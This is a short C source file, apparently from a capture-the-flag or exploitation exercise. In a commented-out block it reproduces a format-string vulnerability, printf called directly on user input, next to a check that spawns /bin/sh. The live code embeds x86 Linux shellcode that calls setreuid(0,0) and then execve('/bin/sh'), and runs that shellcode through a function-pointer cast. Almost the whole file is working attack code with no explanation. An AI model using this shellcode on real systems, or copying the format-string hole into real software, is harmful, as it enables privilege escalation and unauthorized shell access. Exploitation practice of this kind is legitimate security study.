#include <stdio.h>
#include <stdlib.h>

// extern int m;

// static void v(void) {
//     char buf[520];

//     fgets(buf, 512, stdin);
//     printf(buf);   // vulnérabilité de format string

//     if (m == 0x40) {
//         fwrite("Wait what?!\n", 1, 12, stdout);
//         system("/bin/sh");
//     }
// }

char shellcode[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void) {

    int (*func)() = (int (*)())shellcode;
    func();
    
    // v();
    return 0;
}